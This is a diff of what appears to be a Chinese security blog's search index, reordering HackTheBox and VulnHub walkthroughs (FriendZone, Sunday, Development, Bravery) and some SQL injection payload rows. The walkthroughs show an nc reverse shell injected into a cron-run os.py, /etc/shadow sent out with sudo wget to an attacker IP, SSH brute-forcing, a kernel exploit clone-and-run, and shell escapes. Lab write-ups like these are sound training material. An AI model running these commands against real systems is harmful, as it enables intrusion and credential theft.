+<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select column_name from information_schema.columns  WHERE table_name=’operators’ limit 1 offset 0),”!”,”<a href="mailto:&#97;&#x62;&#x63;&#64;&#97;&#x62;&#x63;&#46;&#x63;&#111;&#109;">&#97;&#x62;&#x63;&#64;&#97;&#x62;&#x63;&#46;&#x63;&#111;&#109;</a>“)–+</td>
 <td>id</td>
 </tr>
 <tr>
-<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select column_name from information_schema.columns  WHERE table_name=’operators’ limit 1 offset 1),”!”,”<a href="mailto:&#97;&#98;&#99;&#x40;&#x61;&#x62;&#99;&#x2e;&#99;&#x6f;&#109;">&#97;&#98;&#99;&#x40;&#x61;&#x62;&#99;&#x2e;&#99;&#x6f;&#109;</a>“)–+</td>
+<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select column_name from information_schema.columns  WHERE table_name=’operators’ limit 1 offset 1),”!”,”<a href="mailto:&#x61;&#98;&#x63;&#x40;&#x61;&#98;&#x63;&#46;&#99;&#111;&#109;">&#x61;&#98;&#x63;&#x40;&#x61;&#98;&#x63;&#46;&#99;&#111;&#109;</a>“)–+</td>
 <td>__username_</td>
 </tr>
 <tr>
-<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select column_name from information_schema.columns  WHERE table_name=’operators’ limit 1 offset 2),”!”,”<a href="mailto:&#97;&#x62;&#99;&#64;&#97;&#98;&#x63;&#46;&#99;&#x6f;&#109;">&#97;&#x62;&#99;&#64;&#97;&#98;&#x63;&#46;&#99;&#x6f;&#109;</a>“)–+</td>
+<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select column_name from information_schema.columns  WHERE table_name=’operators’ limit 1 offset 2),”!”,”<a href="mailto:&#x61;&#x62;&#99;&#x40;&#97;&#x62;&#99;&#x2e;&#99;&#x6f;&#109;">&#x61;&#x62;&#99;&#x40;&#97;&#x62;&#99;&#x2e;&#99;&#x6f;&#109;</a>“)–+</td>
 <td>__password_</td>
 </tr>
 </tbody></table>
@@ -2533,83 +2533,6 @@
       </tags>
   </entry>
   <entry>
-    <title>HTB:FriendZone</title>
-    <url>/2020/06/27/HTB-FriendZone/</url>
-    <content><![CDATA[<h1 id="FriendZone"><a href="#FriendZone" class="headerlink" title="FriendZone"></a>FriendZone</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/FriendZone/1.jpg" alt="1"></p>
-<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>尝试21端口匿名登录，失败</p>
-<p>进行smb枚举</p>
-<p>目录枚举</p>
-<p><img src="/images/FriendZone/2.jpg" alt="2"></p>
-<p>nmap枚举出了路径</p>
-<p><img src="/images/FriendZone/14.jpg" alt="14"></p>
-<p>目录权限枚举<br>(这里使用smbmap遇到Authentication error ，需要跟新impacket)</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install --upgrade impacket</span><br><span class="line">smbmap -H 10.10.10.123</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/FriendZone/3.jpg" alt="3"></p>
-<p>对目录树进行枚举</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbmap -H 10.10.10.123 -R --depth 5</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/FriendZone/4.jpg" alt="4"></p>
-<p>发现了creds.txt，看看那是什么</p>
-<p><img src="/images/FriendZone/5.jpg" alt="5"></p>
-<p>发现了账号密码</p>
-<p>访问web服务</p>
-<p><img src="/images/FriendZone/6.jpg" alt="6"></p>
-<p>发现了域名，想到之前的53端口DNS服务，我们应该配置host</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.123 		friendzoneportal.red friendzone.red</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/FriendZone/7.jpg" alt="7"></p>
-<p>进行区域传输</p>
-<p><img src="/images/FriendZone/8.jpg" alt="8"></p>
-<p>发现了更多子域，全部添加到hosts</p>
-<p><img src="/images/FriendZone/9.jpg" alt="9"></p>
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>登录带有admin关键字的网站</p>
-<p>登录错了</p>
-<p><img src="/images/FriendZone/10.jpg" alt="10"></p>
-<p>登录成功</p>
-<p><img src="/images/FriendZone/11.jpg" alt="11"></p>
-<p>跟着提示</p>
-<p><img src="/images/FriendZone/12.jpg" alt="12"></p>
-<p>看样子是文件包含，尝试利用</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对image 尝试 &#x2F;etc&#x2F;passwd 和00截断  都没有用</span><br><span class="line">对pagename 尝试 &#x2F;etc&#x2F;passwd 00截断 也没有用</span><br></pre></td></tr></table></figure>
-
-<p>之后尝试</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pagename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;dashboard.php</span><br></pre></td></tr></table></figure>
-
-<p>失败</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pagename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;dashboard</span><br></pre></td></tr></table></figure>
-
-<p>成功</p>
-<p><img src="/images/FriendZone/13.jpg" alt="13"></p>
-<p>看样子它的包含会添加.php后缀，而且无法截断</p>
-<p>我们已经满足了getshell的条件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smb目录Development允许写入</span><br><span class="line">nmap扫出了上传的路径</span><br><span class="line">本地文件包含执行reverse_shell.php</span><br></pre></td></tr></table></figure>
-
-<p>payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;administrator1.friendzone.red&#x2F;dashboard.php?image_id&#x3D;a.jpg&amp;pagename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;Development&#x2F;evil</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/FriendZone/16.jpg" alt="16"></p>
-<p>getshell</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这个提权特别隐蔽…</p>
-<p>发现os.py具有W权限</p>
-<p><img src="/images/FriendZone/17.jpg" alt="17"></p>
-<p>发现cronjobs</p>
-<p><img src="/images/FriendZone/18.jpg" alt="18"></p>
-<p>调用了os库</p>
-<p><img src="/images/FriendZone/19.jpg" alt="19"></p>
-<p>直接给os加一行，因为还要调用os.system…</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;system(&#39;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.16.100 5555 &gt;&#x2F;tmp&#x2F;f&#39;)&quot; &gt;&gt; os.py</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/FriendZone/20.jpg" alt="20"></p>
-]]></content>
-      <categories>
-        <category>HackTheBox</category>
-      </categories>
-      <tags>
-        <tag>Linux靶机</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HTB:Falafel</title>
     <url>/2020/06/28/HTB-Falafel/</url>
     <content><![CDATA[<h1 id="Falafel"><a href="#Falafel" class="headerlink" title="Falafel"></a>Falafel</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Falafel/1.jpg" alt="1"></p>
@@ -2783,6 +2706,83 @@
 <p>我们甚至能直接读root.txt<br>我们可以读取root的私钥(<code>/root/.ssh/id_rsa</code>)</p>
 <p><img src="/images/Falafel/31.jpg" alt="31"></p>
 <p>成功获取root</p>
+]]></content>
+      <categories>
+        <category>HackTheBox</category>
+      </categories>
+      <tags>
+        <tag>Linux靶机</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTB:FriendZone</title>
+    <url>/2020/06/27/HTB-FriendZone/</url>
+    <content><![CDATA[<h1 id="FriendZone"><a href="#FriendZone" class="headerlink" title="FriendZone"></a>FriendZone</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/FriendZone/1.jpg" alt="1"></p>
+<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>尝试21端口匿名登录，失败</p>
+<p>进行smb枚举</p>
+<p>目录枚举</p>
+<p><img src="/images/FriendZone/2.jpg" alt="2"></p>
+<p>nmap枚举出了路径</p>
+<p><img src="/images/FriendZone/14.jpg" alt="14"></p>
+<p>目录权限枚举<br>(这里使用smbmap遇到Authentication error ，需要跟新impacket)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install --upgrade impacket</span><br><span class="line">smbmap -H 10.10.10.123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/FriendZone/3.jpg" alt="3"></p>
+<p>对目录树进行枚举</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbmap -H 10.10.10.123 -R --depth 5</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/FriendZone/4.jpg" alt="4"></p>
+<p>发现了creds.txt，看看那是什么</p>
+<p><img src="/images/FriendZone/5.jpg" alt="5"></p>
+<p>发现了账号密码</p>
+<p>访问web服务</p>
+<p><img src="/images/FriendZone/6.jpg" alt="6"></p>
+<p>发现了域名，想到之前的53端口DNS服务，我们应该配置host</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.123 		friendzoneportal.red friendzone.red</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/FriendZone/7.jpg" alt="7"></p>
+<p>进行区域传输</p>
+<p><img src="/images/FriendZone/8.jpg" alt="8"></p>
+<p>发现了更多子域，全部添加到hosts</p>
+<p><img src="/images/FriendZone/9.jpg" alt="9"></p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>登录带有admin关键字的网站</p>
+<p>登录错了</p>
+<p><img src="/images/FriendZone/10.jpg" alt="10"></p>
+<p>登录成功</p>
+<p><img src="/images/FriendZone/11.jpg" alt="11"></p>
+<p>跟着提示</p>
+<p><img src="/images/FriendZone/12.jpg" alt="12"></p>
+<p>看样子是文件包含，尝试利用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对image 尝试 &#x2F;etc&#x2F;passwd 和00截断  都没有用</span><br><span class="line">对pagename 尝试 &#x2F;etc&#x2F;passwd 00截断 也没有用</span><br></pre></td></tr></table></figure>
+
+<p>之后尝试</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pagename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;dashboard.php</span><br></pre></td></tr></table></figure>
+
+<p>失败</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pagename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;dashboard</span><br></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="/images/FriendZone/13.jpg" alt="13"></p>
+<p>看样子它的包含会添加.php后缀，而且无法截断</p>
+<p>我们已经满足了getshell的条件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smb目录Development允许写入</span><br><span class="line">nmap扫出了上传的路径</span><br><span class="line">本地文件包含执行reverse_shell.php</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;administrator1.friendzone.red&#x2F;dashboard.php?image_id&#x3D;a.jpg&amp;pagename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;Development&#x2F;evil</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/FriendZone/16.jpg" alt="16"></p>
+<p>getshell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这个提权特别隐蔽…</p>
+<p>发现os.py具有W权限</p>
+<p><img src="/images/FriendZone/17.jpg" alt="17"></p>
+<p>发现cronjobs</p>
+<p><img src="/images/FriendZone/18.jpg" alt="18"></p>
+<p>调用了os库</p>
+<p><img src="/images/FriendZone/19.jpg" alt="19"></p>
+<p>直接给os加一行，因为还要调用os.system…</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;system(&#39;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.16.100 5555 &gt;&#x2F;tmp&#x2F;f&#39;)&quot; &gt;&gt; os.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/FriendZone/20.jpg" alt="20"></p>
 ]]></content>
       <categories>
         <category>HackTheBox</category>
@@ -6151,6 +6151,57 @@
       </tags>
   </entry>
   <entry>
+    <title>HTB:Sunday</title>
+    <url>/2020/06/25/HTB-Sunday/</url>
+    <content><![CDATA[<h1 id="Sunday"><a href="#Sunday" class="headerlink" title="Sunday"></a>Sunday</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Sunday/1.jpg" alt="1"></p>
+<p>发现了不常用端口79，finger服务可以查看当前系统用户信息<br>ssh开在了22022</p>
+<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>使用finger-user-enum进行枚举</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">finger-user-enum.pl -U &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Usernames&#x2F;Names&#x2F;names.txt -t 10.10.10.76</span><br></pre></td></tr></table></figure>
+
+<p>发现账户sunny和sammy</p>
+<p><img src="/images/Sunday/3.jpg" alt="3"></p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="爆破ssh"><a href="#爆破ssh" class="headerlink" title="爆破ssh"></a>爆破ssh</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">medusa -f -u sunny -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -M ssh -n 22022 -h 10.10.10.76</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Sunday/4.jpg" alt="4"></p>
+<p><code>sunny/sunday</code></p>
+<p>使用ssh进行连接，需要指定端口22022</p>
+<p><img src="/images/Sunday/2.jpg" alt="2"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在根目录发现了backup文件夹</p>
+<p><img src="/images/Sunday/5.jpg" alt="5"></p>
+<p>发现了sammy的hash，尝试破解<code>$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john hash.txt --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Sunday/6.jpg" alt="6"></p>
+<p>成功破解出密码<code>cooldude!</code><br>成功切换账号</p>
+<p><img src="/images/Sunday/7.jpg" alt="7"></p>
+<p>并且发现，我能够以root运行wget</p>
+<p>接收发送的shadow文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo wget --post-file&#x3D;&#x2F;etc&#x2F;shadow 10.10.16.99:4444</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Sunday/8.jpg" alt="8"></p>
+<p>修改root密码为我们知道的密码就可以了</p>
+<p>覆盖shadow</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo wget http:&#x2F;&#x2F;10.10.16.99&#x2F;shadow -O shadow</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Sunday/9.jpg" alt="9"></p>
+<p>另外，wget的i参数可以以某个文件内存放的内容作为参数，如果参数不合法，就会报错，利用这点可以快速读取任意文件</p>
+<p><img src="/images/Sunday/10.png" alt="10"></p>
+<p>方法2</p>
+<p>sunny用户有一个可以以root运行的shell脚本，利用sammy的wget覆盖那个shell脚本，payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">bash</span><br></pre></td></tr></table></figure>
+
+<p>之后sudo运行那个脚本，也可以获得shell</p>
+]]></content>
+      <categories>
+        <category>HackTheBox</category>
+      </categories>
+      <tags>
+        <tag>Linux靶机</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB:Spectra</title>
     <url>/2021/02/28/HTB-Spectra/</url>
     <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>添加host</p>
@@ -6208,57 +6259,6 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh suser@spectra.htb</span><br><span class="line">toor</span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/Spectra/15.png" alt="15"></p>
-]]></content>
-      <categories>
-        <category>HackTheBox</category>
-      </categories>
-      <tags>
-        <tag>Linux靶机</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTB:Sunday</title>
-    <url>/2020/06/25/HTB-Sunday/</url>
-    <content><![CDATA[<h1 id="Sunday"><a href="#Sunday" class="headerlink" title="Sunday"></a>Sunday</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Sunday/1.jpg" alt="1"></p>
-<p>发现了不常用端口79，finger服务可以查看当前系统用户信息<br>ssh开在了22022</p>
-<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>使用finger-user-enum进行枚举</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">finger-user-enum.pl -U &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Usernames&#x2F;Names&#x2F;names.txt -t 10.10.10.76</span><br></pre></td></tr></table></figure>
-
-<p>发现账户sunny和sammy</p>
-<p><img src="/images/Sunday/3.jpg" alt="3"></p>
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="爆破ssh"><a href="#爆破ssh" class="headerlink" title="爆破ssh"></a>爆破ssh</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">medusa -f -u sunny -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -M ssh -n 22022 -h 10.10.10.76</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Sunday/4.jpg" alt="4"></p>
-<p><code>sunny/sunday</code></p>
-<p>使用ssh进行连接，需要指定端口22022</p>
-<p><img src="/images/Sunday/2.jpg" alt="2"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在根目录发现了backup文件夹</p>
-<p><img src="/images/Sunday/5.jpg" alt="5"></p>
-<p>发现了sammy的hash，尝试破解<code>$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john hash.txt --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Sunday/6.jpg" alt="6"></p>
-<p>成功破解出密码<code>cooldude!</code><br>成功切换账号</p>
-<p><img src="/images/Sunday/7.jpg" alt="7"></p>
-<p>并且发现，我能够以root运行wget</p>
-<p>接收发送的shadow文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo wget --post-file&#x3D;&#x2F;etc&#x2F;shadow 10.10.16.99:4444</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Sunday/8.jpg" alt="8"></p>
-<p>修改root密码为我们知道的密码就可以了</p>
-<p>覆盖shadow</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo wget http:&#x2F;&#x2F;10.10.16.99&#x2F;shadow -O shadow</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Sunday/9.jpg" alt="9"></p>
-<p>另外，wget的i参数可以以某个文件内存放的内容作为参数，如果参数不合法，就会报错，利用这点可以快速读取任意文件</p>
-<p><img src="/images/Sunday/10.png" alt="10"></p>
-<p>方法2</p>
-<p>sunny用户有一个可以以root运行的shell脚本，利用sammy的wget覆盖那个shell脚本，payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">bash</span><br></pre></td></tr></table></figure>
-
-<p>之后sudo运行那个脚本，也可以获得shell</p>
 ]]></content>
       <categories>
         <category>HackTheBox</category>
@@ -8328,62 +8328,6 @@
       </tags>
   </entry>
   <entry>
-    <title>靶场Digitalworld.local(Development)</title>
-    <url>/2020/05/25/%E9%9D%B6%E5%9C%BADigitalworld-local-Development/</url>
-    <content><![CDATA[<h1 id="Digitalworld-local-Development"><a href="#Digitalworld-local-Development" class="headerlink" title="Digitalworld.local(Development)"></a>Digitalworld.local(Development)</h1><p>Kali:192.168.1.3</p>
-<p>靶场:192.168.1.233</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Development/1.jpg" alt="1"></p>
-<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>访问8080端口运行的web服务</p>
-<p><img src="/images/Development/2.jpg" alt="2"></p>
-<p>发现一个页面， 提示去查看<code>html_pages</code></p>
-<p><img src="/images/Development/3.jpg" alt="3"></p>
-<p>根据之前的提示，应该要去访问<code>development.html</code></p>
-<p><img src="/images/Development/4.jpg" alt="4"></p>
-<p>接着又提示访问<code>developmentsecretpage</code></p>
-<p>最后来到下面的登录框</p>
-<p><img src="/images/Development/5.jpg" alt="5"></p>
-<p>随便输入一些内容，最终跳到了下面的页面</p>
-<p><img src="/images/Development/6.jpg" alt="6"></p>
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="exploitDB"><a href="#exploitDB" class="headerlink" title="exploitDB"></a>exploitDB</h3><p>页面比较有用的提示是<code>slogin_lib.inc.php</code></p>
-<p>我在<a href="https://www.exploit-db.com/exploits/7444">exploitDB</a>中找到了相关漏洞</p>
-<p><img src="/images/Development/7.jpg" alt="7"></p>
-<p>它会在<code>slog_users.txt</code>中存放一个明文用户名和未加盐的hash密码</p>
-<p><img src="/images/Development/8.jpg" alt="8"></p>
-<p>使用hashcat破解md5</p>
-<p><img src="/images/Development/9.png" alt="9"></p>
-<p>破解出了三个密码</p>
-<p>尝试进行ssh，用户intern是可以建立连接的，不过是个rbash</p>
-<p><img src="/images/Development/10.jpg" alt="10"></p>
-<h3 id="shell逃逸"><a href="#shell逃逸" class="headerlink" title="shell逃逸"></a>shell逃逸</h3><p>既然有echo，就可以尝试python来逃逸</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo os.system(&quot;&#x2F;bin&#x2F;bash&quot;)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Development/11.jpg" alt="11"></p>
-<p>逃逸成功</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>内核版本为4.15</p>
-<p><img src="/images/Development/12.jpg" alt="12"></p>
-<p>搜索公开漏洞，发现可以使用<a href="https://github.com/bcoles/kernel-exploits">CVE-2018-18955</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;bcoles&#x2F;kernel-exploits.git</span><br><span class="line">cd kernel-exploits&#x2F;CVE-2018-18955&#x2F; </span><br><span class="line">gcc subuid_shell.c -o exp</span><br><span class="line">.&#x2F;exp</span><br><span class="line">gcc subshell.c -o subshell</span><br><span class="line">.&#x2F;subshell</span><br><span class="line">.&#x2F;exp</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Development/15.jpg" alt="15"></p>
-<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p><code>/etc/passwd</code>发现，patrick也拥有bash shell，不过之前ssh连接不上</p>
-<p>尝试使用su切换用户，成功用patrick登录</p>
-<p><img src="/images/Development/17.jpg" alt="17"></p>
-<p>而且该账户可以使用root权限使用vim和nano这样的文本编辑器</p>
-<p>那就代表可以修改<code>/etc/passwd</code>这样存放敏感信息的文件进行提权</p>
-<p>也可以运行vim输入</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:!&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
-
-<p>直接获取root bash</p>
-<p><img src="/images/Development/18.jpg" alt="18"></p>
-]]></content>
-      <categories>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>Linux靶机</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>靶场Digitalworld.local (Bravery)</title>
     <url>/2020/05/25/%E9%9D%B6%E5%9C%BADigitalworld-local-Bravery/</url>
     <content><![CDATA[<h1 id="Digitalworld-local-Bravery"><a href="#Digitalworld-local-Bravery" class="headerlink" title="Digitalworld.local(Bravery)"></a>Digitalworld.local(Bravery)</h1><p>Kali:192.168.1.3</p>
@@ -8446,6 +8390,62 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">wget http:&#x2F;&#x2F;192.168.1.3&#x2F;passwd</span><br><span class="line">cp passwd &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/Bravery/20.jpg" alt="20"></p>
+]]></content>
+      <categories>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Linux靶机</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>靶场Digitalworld.local(Development)</title>
+    <url>/2020/05/25/%E9%9D%B6%E5%9C%BADigitalworld-local-Development/</url>
+    <content><![CDATA[<h1 id="Digitalworld-local-Development"><a href="#Digitalworld-local-Development" class="headerlink" title="Digitalworld.local(Development)"></a>Digitalworld.local(Development)</h1><p>Kali:192.168.1.3</p>
+<p>靶场:192.168.1.233</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Development/1.jpg" alt="1"></p>
+<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>访问8080端口运行的web服务</p>
+<p><img src="/images/Development/2.jpg" alt="2"></p>
+<p>发现一个页面， 提示去查看<code>html_pages</code></p>
+<p><img src="/images/Development/3.jpg" alt="3"></p>
+<p>根据之前的提示，应该要去访问<code>development.html</code></p>
+<p><img src="/images/Development/4.jpg" alt="4"></p>
+<p>接着又提示访问<code>developmentsecretpage</code></p>
+<p>最后来到下面的登录框</p>
+<p><img src="/images/Development/5.jpg" alt="5"></p>
+<p>随便输入一些内容，最终跳到了下面的页面</p>
+<p><img src="/images/Development/6.jpg" alt="6"></p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="exploitDB"><a href="#exploitDB" class="headerlink" title="exploitDB"></a>exploitDB</h3><p>页面比较有用的提示是<code>slogin_lib.inc.php</code></p>
+<p>我在<a href="https://www.exploit-db.com/exploits/7444">exploitDB</a>中找到了相关漏洞</p>
+<p><img src="/images/Development/7.jpg" alt="7"></p>
+<p>它会在<code>slog_users.txt</code>中存放一个明文用户名和未加盐的hash密码</p>
+<p><img src="/images/Development/8.jpg" alt="8"></p>
+<p>使用hashcat破解md5</p>
+<p><img src="/images/Development/9.png" alt="9"></p>
+<p>破解出了三个密码</p>
+<p>尝试进行ssh，用户intern是可以建立连接的，不过是个rbash</p>
+<p><img src="/images/Development/10.jpg" alt="10"></p>
+<h3 id="shell逃逸"><a href="#shell逃逸" class="headerlink" title="shell逃逸"></a>shell逃逸</h3><p>既然有echo，就可以尝试python来逃逸</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo os.system(&quot;&#x2F;bin&#x2F;bash&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Development/11.jpg" alt="11"></p>
+<p>逃逸成功</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>内核版本为4.15</p>
+<p><img src="/images/Development/12.jpg" alt="12"></p>
